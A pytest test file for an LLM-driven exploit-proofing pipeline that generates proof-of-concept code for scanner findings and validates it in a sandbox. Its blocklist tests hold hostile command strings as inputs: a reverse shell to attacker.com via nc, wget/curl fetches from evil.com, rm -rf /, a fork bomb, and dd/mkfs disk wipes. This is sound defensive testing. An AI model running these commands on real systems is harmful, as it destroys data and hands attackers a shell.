#!/usr/bin/env python3
"""Tests for ProofByExploitation and ExploitGenerator.

Validates the LLM-powered exploit generation pipeline and its
integration with the sandbox validator.
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Add scripts directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "scripts"))

from sandbox_validator import (
    EXPLOIT_SAFETY_BLOCKLIST,
    ExploitConfig,
    ExploitGenerator,
    ExploitType,
    ProofByExploitation,
    ValidationMetrics,
    ValidationResult,
)


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def mock_llm():
    """Return a mock LLM callable that produces safe Python PoC code."""

    def _llm(prompt: str) -> str:
        return (
            "import sqlite3\n"
            "conn = sqlite3.connect(':memory:')\n"
            "print('EXPLOITABLE')\n"
        )

    return _llm


@pytest.fixture
def mock_llm_markdown():
    """Return a mock LLM callable that wraps its response in markdown."""

    def _llm(prompt: str) -> str:
        return (
            "```python\n"
            "print('EXPLOITABLE')\n"
            "```\n"
        )

    return _llm


@pytest.fixture
def mock_llm_unsafe():
    """Return a mock LLM callable that produces dangerous code."""

    def _llm(prompt: str) -> str:
        return "import subprocess\nimport os\nos.system('rm -rf /')"

    return _llm


@pytest.fixture
def sample_finding():
    """Return a sample finding dict."""
    return {
        "severity": "high",
        "message": "SQL injection in user query",
        "file": "app/db.py",
        "line": 42,
        "cwe": "CWE-89",
        "description": "User input directly interpolated into SQL query",
    }


@pytest.fixture
def sample_findings():
    """Return a list of findings with mixed severities."""
    return [
        {
            "severity": "low",
            "message": "Info leak via verbose error",
            "file": "app/errors.py",
            "line": 10,
            "cwe": "CWE-209",
            "description": "Stack traces exposed in production",
        },
        {
            "severity": "critical",
            "message": "Remote code execution via deserialization",
            "file": "app/api.py",
            "line": 88,
            "cwe": "CWE-502",
            "description": "Untrusted pickle deserialization",
        },
        {
            "severity": "medium",
            "message": "Open redirect",
            "file": "app/auth.py",
            "line": 55,
            "cwe": "CWE-601",
            "description": "Unvalidated redirect URL parameter",
        },
        {
            "severity": "high",
            "message": "SQL injection in search",
            "file": "app/search.py",
            "line": 33,
            "cwe": "CWE-89",
            "description": "User input concatenated into SQL query",
        },
    ]


@pytest.fixture
def generator(mock_llm):
    """Return an ExploitGenerator with a mock LLM."""
    return ExploitGenerator(llm_call_fn=mock_llm)


@pytest.fixture
def mock_validator():
    """Return a mocked SandboxValidator."""
    validator = MagicMock(spec=["validate_exploit"])
    validator.validate_exploit.return_value = ValidationMetrics(
        validation_id="v-test-1",
        exploit_name="test-exploit",
        exploit_type="code_injection",
        result=ValidationResult.EXPLOITABLE.value,
        execution_time_ms=150,
        stdout="EXPLOITABLE\n",
        stderr="",
        exit_code=0,
        indicators_found=["EXPLOITABLE"],
        indicators_missing=[],
        container_id="container-abc",
        timestamp="2025-01-01T00:00:00Z",
    )
    return validator


# ---------------------------------------------------------------------------
# TestExploitSafetyBlocklist
# ---------------------------------------------------------------------------


class TestExploitSafetyBlocklist:
    """Validate the EXPLOIT_SAFETY_BLOCKLIST constant."""

    def test_blocklist_is_non_empty(self):
        assert len(EXPLOIT_SAFETY_BLOCKLIST) > 0

    def test_all_items_are_strings(self):
        for item in EXPLOIT_SAFETY_BLOCKLIST:
            assert isinstance(item, str), f"Blocklist item is not a string: {item!r}"

    def test_blocklist_contains_known_dangerous_patterns(self):
        patterns_expected = ["rm -rf", ":(){ :|:& };:", "wget ", "eval(", "__import__"]
        for pattern in patterns_expected:
            assert pattern in EXPLOIT_SAFETY_BLOCKLIST, (
                f"Expected dangerous pattern missing from blocklist: {pattern!r}"
            )

    def test_blocklist_items_are_non_empty(self):
        for item in EXPLOIT_SAFETY_BLOCKLIST:
            assert item.strip(), "Blocklist must not contain empty strings"


# ---------------------------------------------------------------------------
# TestExploitSafetyValidation
# ---------------------------------------------------------------------------


class TestExploitSafetyValidation:
    """Test ExploitGenerator.validate_exploit_safety against blocklist."""

    def setup_method(self):
        self.gen = ExploitGenerator()

    def test_safe_code_passes(self):
        safe = "print('hello world')\nx = 1 + 2\n"
        assert self.gen.validate_exploit_safety(safe) is True

    def test_rm_rf_blocked(self):
        code = "import os\nos.system('rm -rf /')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_fork_bomb_blocked(self):
        code = ":(){ :|:& };:"
        assert self.gen.validate_exploit_safety(code) is False

    def test_wget_blocked(self):
        code = "os.system('wget http://evil.com/payload')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_curl_blocked(self):
        code = "os.system('curl http://evil.com/payload')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_nc_blocked(self):
        code = "os.system('nc -e /bin/sh attacker.com 4444')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_netcat_blocked(self):
        code = "os.system('netcat attacker.com 4444')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_eval_blocked(self):
        code = "eval('__import__(\"os\").system(\"id\")')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_exec_blocked(self):
        code = "exec('print(1)')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_dunder_import_blocked(self):
        code = "__import__('os').system('id')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_import_socket_blocked(self):
        code = "import socket\ns = socket.socket()"
        assert self.gen.validate_exploit_safety(code) is False

    def test_import_subprocess_blocked(self):
        code = "import subprocess\nsubprocess.run(['ls'])"
        assert self.gen.validate_exploit_safety(code) is False

    def test_shutdown_blocked(self):
        code = "os.system('shutdown -h now')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_reboot_blocked(self):
        code = "os.system('reboot')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_dd_blocked(self):
        code = "os.system('dd if=/dev/zero of=/dev/sda')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_mkfs_blocked(self):
        code = "os.system('mkfs.ext4 /dev/sda1')"
        assert self.gen.validate_exploit_safety(code) is False

    def test_case_insensitive_check(self):
        code = "EVAL('something')"
        assert self.gen.validate_exploit_safety(code) is False


# ---------------------------------------------------------------------------
# TestExploitGenerator
# ---------------------------------------------------------------------------


class TestExploitGenerator:
    """Test ExploitGenerator methods."""

    def test_generate_exploit_with_mock_llm(self, mock_llm, sample_finding):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        exploit = gen.generate_exploit(sample_finding, source_code="cursor.execute(f'SELECT * FROM users WHERE id={user_id}')")
        assert exploit is not None
        assert isinstance(exploit, ExploitConfig)
        assert exploit.language == "python"
        assert "EXPLOITABLE" in exploit.code

    def test_generate_exploit_returns_none_when_no_llm(self, sample_finding):
        gen = ExploitGenerator(llm_call_fn=None)
        result = gen.generate_exploit(sample_finding)
        assert result is None

    def test_generate_exploit_returns_none_when_safety_fails(self, mock_llm_unsafe, sample_finding):
        gen = ExploitGenerator(llm_call_fn=mock_llm_unsafe)
        result = gen.generate_exploit(sample_finding)
        assert result is None

    def test_build_exploit_prompt_contains_finding_details(self, sample_finding):
        gen = ExploitGenerator()
        prompt = gen._build_exploit_prompt(sample_finding, source_code="SELECT * FROM users")
        assert "high" in prompt  # severity
        assert "SQL injection" in prompt  # message
        assert "app/db.py" in prompt  # file
        assert "CWE-89" in prompt  # cwe
        assert "SELECT * FROM users" in prompt  # source code

    def test_build_exploit_prompt_truncates_long_source(self):
        gen = ExploitGenerator()
        finding = {"severity": "low", "message": "test"}
        long_source = "x" * 5000
        prompt = gen._build_exploit_prompt(finding, long_source)
        # Source should be truncated to 2000 chars
        assert len(prompt) < 5000 + 500  # prompt overhead plus truncated source

    def test_build_exploit_prompt_handles_missing_fields(self):
        gen = ExploitGenerator()
        finding = {}  # completely empty finding
        prompt = gen._build_exploit_prompt(finding, source_code="")
        assert "unknown" in prompt  # default severity
        assert "Not available" in prompt  # no source code

    def test_parse_exploit_response_strips_markdown(self, mock_llm_markdown, sample_finding):
        gen = ExploitGenerator(llm_call_fn=mock_llm_markdown)
        exploit = gen.generate_exploit(sample_finding)
        assert exploit is not None
        # Code should not contain ``` markers
        assert "```" not in exploit.code
        assert "EXPLOITABLE" in exploit.code

    def test_parse_exploit_response_detects_javascript(self):
        gen = ExploitGenerator()
        finding = {"file": "app/handler.js", "message": "xss"}
        exploit = gen._parse_exploit_response("console.log('EXPLOITABLE')", finding)
        assert exploit is not None
        assert exploit.language == "javascript"

    def test_parse_exploit_response_detects_typescript(self):
        gen = ExploitGenerator()
        finding = {"file": "app/handler.ts", "message": "xss"}
        exploit = gen._parse_exploit_response("console.log('EXPLOITABLE')", finding)
        assert exploit is not None
        assert exploit.language == "javascript"

    def test_parse_exploit_response_detects_go(self):
        gen = ExploitGenerator()
        finding = {"file": "main.go", "message": "injection"}
        exploit = gen._parse_exploit_response("fmt.Println(\"EXPLOITABLE\")", finding)
        assert exploit is not None
        assert exploit.language == "go"

    def test_parse_exploit_response_detects_java(self):
        gen = ExploitGenerator()
        finding = {"file": "App.java", "message": "deserialization"}
        exploit = gen._parse_exploit_response("System.out.println(\"EXPLOITABLE\");", finding)
        assert exploit is not None
        assert exploit.language == "java"

    def test_parse_exploit_response_defaults_to_python(self):
        gen = ExploitGenerator()
        finding = {"file": "app/core.py", "message": "sqli"}
        exploit = gen._parse_exploit_response("print('EXPLOITABLE')", finding)
        assert exploit is not None
        assert exploit.language == "python"

    def test_parse_exploit_response_returns_none_for_empty(self):
        gen = ExploitGenerator()
        finding = {"file": "app.py", "message": "test"}
        assert gen._parse_exploit_response("", finding) is None
        assert gen._parse_exploit_response("   ", finding) is None

    def test_parse_exploit_response_returns_none_for_only_markdown_fence(self):
        gen = ExploitGenerator()
        finding = {"file": "app.py", "message": "test"}
        # A response with only markdown fences and no code body
        result = gen._parse_exploit_response("```python\n```", finding)
        assert result is None

    def test_generated_exploit_has_expected_indicators(self, mock_llm, sample_finding):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        exploit = gen.generate_exploit(sample_finding)
        assert exploit is not None
        assert "EXPLOITABLE" in exploit.expected_indicators

    def test_generated_exploit_has_name_with_cwe(self, mock_llm, sample_finding):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        exploit = gen.generate_exploit(sample_finding)
        assert exploit is not None
        assert "CWE-89" in exploit.name

    def test_generated_exploit_type_is_code_injection(self, mock_llm, sample_finding):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        exploit = gen.generate_exploit(sample_finding)
        assert exploit is not None
        assert exploit.exploit_type == ExploitType.CODE_INJECTION

    def test_generated_exploit_has_timeout(self, mock_llm, sample_finding):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        exploit = gen.generate_exploit(sample_finding)
        assert exploit is not None
        assert exploit.timeout == 30


# ---------------------------------------------------------------------------
# TestProofByExploitation
# ---------------------------------------------------------------------------


class TestProofByExploitation:
    """Test ProofByExploitation orchestration."""

    def test_prove_findings_enriches_findings(
        self, mock_llm, mock_validator, sample_finding
    ):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        results = prover.prove_findings([sample_finding])

        assert len(results) == 1
        enriched = results[0]
        assert enriched["exploitability"] == ValidationResult.EXPLOITABLE.value
        assert "poc_code" in enriched
        assert "sandbox_result" in enriched
        assert enriched["sandbox_result"]["status"] == ValidationResult.EXPLOITABLE.value

    def test_max_exploits_limit_respected(self, mock_llm, mock_validator, sample_findings):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        results = prover.prove_findings(sample_findings, max_exploits=2)

        assert len(results) == len(sample_findings)

        tested_count = sum(
            1 for r in results if r["exploitability"] not in ("not_tested", "generation_failed")
        )
        not_tested_count = sum(1 for r in results if r["exploitability"] == "not_tested")

        assert tested_count == 2
        assert not_tested_count == 2

    def test_findings_sorted_by_severity_critical_first(
        self, mock_llm, mock_validator, sample_findings
    ):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        # Only allow 1 exploit so we can see which finding is tested first
        results = prover.prove_findings(sample_findings, max_exploits=1)

        # The critical finding should be the one that got tested
        tested = [r for r in results if r.get("poc_code")]
        assert len(tested) == 1
        assert tested[0]["severity"] == "critical"

    def test_sandbox_error_handled_gracefully(self, mock_llm, sample_finding):
        failing_validator = MagicMock(spec=["validate_exploit"])
        failing_validator.validate_exploit.side_effect = RuntimeError("Docker daemon not running")

        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=failing_validator, generator=gen)

        results = prover.prove_findings([sample_finding])

        assert len(results) == 1
        assert results[0]["exploitability"] == "sandbox_error"
        assert "error" in results[0]["sandbox_result"]
        assert "Docker daemon" in results[0]["sandbox_result"]["error"]

    def test_generation_failure_marked_correctly(self, sample_finding):
        # No LLM function -> generation fails
        gen = ExploitGenerator(llm_call_fn=None)
        validator = MagicMock(spec=["validate_exploit"])
        prover = ProofByExploitation(validator=validator, generator=gen)

        results = prover.prove_findings([sample_finding])

        assert len(results) == 1
        assert results[0]["exploitability"] == "generation_failed"
        # Validator should never be called if generation failed
        validator.validate_exploit.assert_not_called()

    def test_source_code_passed_to_generator(self, mock_validator, sample_finding):
        captured_source = {}

        def tracking_llm(prompt: str) -> str:
            captured_source["prompt"] = prompt
            return "print('EXPLOITABLE')"

        gen = ExploitGenerator(llm_call_fn=tracking_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        source_files = {"app/db.py": "cursor.execute(f'SELECT * FROM users WHERE id={uid}')"}
        prover.prove_findings([sample_finding], source_files=source_files)

        assert "prompt" in captured_source
        assert "cursor.execute" in captured_source["prompt"]

    def test_source_files_default_to_empty(self, mock_llm, mock_validator, sample_finding):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        # Should not raise even without source_files
        results = prover.prove_findings([sample_finding])
        assert len(results) == 1

    def test_empty_findings_returns_empty_list(self, mock_llm, mock_validator):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        results = prover.prove_findings([])
        assert results == []

    def test_sandbox_result_contains_output_and_duration(
        self, mock_llm, mock_validator, sample_finding
    ):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        results = prover.prove_findings([sample_finding])
        sandbox_result = results[0]["sandbox_result"]

        assert "output" in sandbox_result
        assert "duration_ms" in sandbox_result
        assert "status" in sandbox_result
        assert sandbox_result["duration_ms"] == 150

    def test_finding_original_fields_preserved(
        self, mock_llm, mock_validator, sample_finding
    ):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        results = prover.prove_findings([sample_finding])
        enriched = results[0]

        # Original fields should still be present
        assert enriched["severity"] == "high"
        assert enriched["message"] == "SQL injection in user query"
        assert enriched["file"] == "app/db.py"
        assert enriched["line"] == 42
        assert enriched["cwe"] == "CWE-89"

    def test_multiple_findings_all_enriched(
        self, mock_llm, mock_validator, sample_findings
    ):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        results = prover.prove_findings(sample_findings, max_exploits=100)
        assert len(results) == len(sample_findings)

        for r in results:
            assert "exploitability" in r

    def test_not_tested_findings_have_no_poc_code(
        self, mock_llm, mock_validator, sample_findings
    ):
        gen = ExploitGenerator(llm_call_fn=mock_llm)
        prover = ProofByExploitation(validator=mock_validator, generator=gen)

        results = prover.prove_findings(sample_findings, max_exploits=1)

        not_tested = [r for r in results if r["exploitability"] == "not_tested"]
        for r in not_tested:
            assert "poc_code" not in r


# ---------------------------------------------------------------------------
# TestConfigLoader integration
# ---------------------------------------------------------------------------


class TestConfigLoaderProofByExploitationDefaults:
    """Verify proof-by-exploitation config keys are wired in config_loader."""

    def test_default_config_has_enable_toggle(self):
        from config_loader import get_default_config

        config = get_default_config()
        assert "enable_proof_by_exploitation" in config
        assert config["enable_proof_by_exploitation"] is False  # opt-in

    def test_default_config_has_max_exploit_attempts(self):
        from config_loader import get_default_config

        config = get_default_config()
        assert "max_exploit_attempts" in config
        assert config["max_exploit_attempts"] == 10
